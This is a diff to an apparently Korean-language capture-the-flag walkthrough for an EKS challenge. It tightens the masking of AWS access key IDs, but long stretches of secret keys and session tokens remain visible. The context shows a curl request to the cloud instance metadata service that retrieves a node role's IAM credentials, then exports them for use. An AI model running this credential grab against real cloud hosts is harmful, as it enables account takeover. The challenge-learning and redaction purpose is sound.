@@ -529,13 +529,13 @@ IMDS(인스턴스 메타데이터) 조회 --> 사용 가능한 IAM 역할 이름
 
 ```
 root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
-{"AccessKeyId":"ASIA2AVYNEVMYZY5GUXC","Expiration":"2026-04-09 06:31:39+00:00","SecretAccessKey":"Wzil02DGQw4QlwTT8ohdz2A+************************","SessionToken":"FwoGZXIvYXdzEFcaDLZuD41D**************************************************************************rNfChxJM1JLPvp/5TP93JMQ3XNDhdwkg8c9FkdQ4pzb561E34vylxszl38UDOEFKddweB8dbO1LEO8czdlxXYou16nYGk9J0RdAFWxLeAyVHiWHHUZi/5FUIqc2jNH47W+m/L1QiFQl8/O0YMqo6ZQsADBDSRAYJoU3VivZaZHaRMVYW0rva2aWpb7+aDGyi789zOBjItYe3wUoizjtcwFvCFi3vrqf0NpcmAVzBGgTUghiicFRIjNTg6KArSbfkzop1Z"}
+{"AccessKeyId":"ASIA2AVYNE************","Expiration":"2026-04-09 06:31:39+00:00","SecretAccessKey":"Wzil02DGQw4QlwTT8ohdz2A+************************","SessionToken":"FwoGZXIvYXdzEFcaDLZuD41D**************************************************************************rNfChxJM1JLPvp/5TP93JMQ3XNDhdwkg8c9FkdQ4pzb561E34vylxszl38UDOEFKddweB8dbO1LEO8czdlxXYou16nYGk9J0RdAFWxLeAyVHiWHHUZi/5FUIqc2jNH47W+m/L1QiFQl8/O0YMqo6ZQsADBDSRAYJoU3VivZaZHaRMVYW0rva2aWpb7+aDGyi789zOBjItYe3wUoizjtcwFvCFi3vrqf0NpcmAVzBGgTUghiicFRIjNTg6KArSbfkzop1Z"}
 ```
 
 키 획득 성공
 
 ```
-export AWS_ACCESS_KEY_ID="ASIA2AVYNEVMYAFGBYVG"
+export AWS_ACCESS_KEY_ID="ASIA2AVYNEV*********"
 export AWS_SECRET_ACCESS_KEY="nhqK1nCqXcgiiAPB************************"
 export AWS_SESSION_TOKEN="FwoGZXIvYXdzE****************************************************************************7oxfV4OVnjMe55Y6P+7VcyMPrE7iaLCr14mFNLGrUOek01vFT+YdveF+2qeOr/iOtOR2iB7oAEhis2FmortomfxP4PInwmY0gxXogZz49jwiIq3Cyfocmo3nKsy9Qw+oqT8ZP8crLVCIk66qCQNuhAglmnSmkZY/7/oc1ITTlyCOTw8hAb5oH3H29uC8Jqj8nKb9xyiIgd3OBjItyVOY8sDJQBBL7O+HuD0GOvDU0ewi3sF8qAF7pKywRYubDWtMu3qvnVc1uSYv"
 ```
